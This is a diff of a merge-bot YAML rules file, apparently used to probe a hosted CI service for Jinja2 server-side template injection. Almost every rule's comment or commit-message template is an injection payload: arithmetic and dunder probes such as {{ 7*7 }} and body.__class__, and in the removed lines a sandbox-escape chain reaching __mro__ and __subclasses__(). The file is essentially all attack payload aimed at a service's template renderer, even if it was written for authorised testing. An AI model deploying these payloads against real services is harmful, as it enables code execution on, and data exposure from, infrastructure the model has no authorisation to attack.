@@ -12,26 +12,47 @@ queue_rules:
       - base = main
     merge_conditions: []
     merge_method: merge
-    commit_message_template: "{{ '{0.__class__}'.format(body) }}"
+    commit_message_template: "{{ 7*7 }}"
 pull_request_rules:
-  - name: vm6-j2fmt-cls-261019
+  - name: vm6-j2-A-fmtp-261019
     conditions:
       - title = Add vm6 ssti render probe file
     actions:
       comment:
         message: |
-          [FmtClass] {{ '{0.__class__}'.format(body) }}
-  - name: vm6-j2fmt-sub-261019
+          [FmtPlain] {{ 'a{0}'.format(body) }}
+  - name: vm6-j2-B-fmtd-261019
     conditions:
       - title = Add vm6 ssti render probe file
     actions:
       comment:
         message: |
-          [FmtSub] {{ '{0.__class__.__mro__[1].__subclasses__()}'.format(body) }}
-  - name: vm6-j2ctl-body-261019
+          [FmtDu] {{ '{0}'.format(body) }}
+  - name: vm6-j2-C-mthd-261019
     conditions:
       - title = Add vm6 ssti render probe file
     actions:
       comment:
         message: |
-          [CtlBody] {{ body }}
+          [Method] {{ body.upper() }}
+  - name: vm6-j2-D-arith-261019
+    conditions:
+      - title = Add vm6 ssti render probe file
+    actions:
+      comment:
+        message: |
+          [Arith] {{ 7*7 }}
+  - name: vm6-j2-E-dunder-261019
+    conditions:
+      - title = Add vm6 ssti render probe file
+    actions:
+      comment:
+        message: |
+          [Dunder] {{ body.__class__ }}
+  - name: vm6-j2-F-join-261019
+    conditions:
+      - title = Add vm6 ssti render probe file
+    actions:
+      comment:
+        message: |
+          [JoinCtl] {{ labels | join(',') }}
